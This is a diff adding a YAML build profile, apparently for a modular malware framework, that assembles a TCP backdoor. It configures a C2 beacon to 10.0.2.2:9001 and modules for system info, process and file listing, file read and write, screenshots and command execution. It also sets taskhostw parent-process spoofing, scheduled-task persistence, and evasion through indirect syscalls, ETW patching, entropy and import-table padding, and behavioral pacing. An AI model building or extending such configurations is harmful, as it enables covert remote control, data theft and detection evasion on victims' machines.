@@ -1,0 +1,39 @@
+name: backdoor_ppid_taskhostw
+description: TCP backdoor with taskhostw PPID spoofing and scheduled task persistence
+
+core:
+  - core/emit_buffer
+  - core/file_ops
+  - core/run_cmd
+
+c2: c2/tcp_beacon
+
+commands:
+  - commands/cmd_sysinfo
+  - commands/cmd_processes
+  - commands/cmd_filelist
+  - commands/cmd_fileread
+  - commands/cmd_filewrite
+  - commands/cmd_screenshot
+  - commands/cmd_exec
+
+arch: arch/backdoor
+
+api_resolve: api_resolve/api_hash_djb2
+process: process/ppid_spoof_taskhostw
+
+persist: persist/scheduled_task
+
+resources: true
+
+evasion:
+  - evasion/indirect_syscall
+  - evasion/etw_patch
+  - evasion/entropy_pad
+  - evasion/iat_pad
+  - evasion/behavioral_pacing
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  BEACON_INTERVAL_MS: "30000"
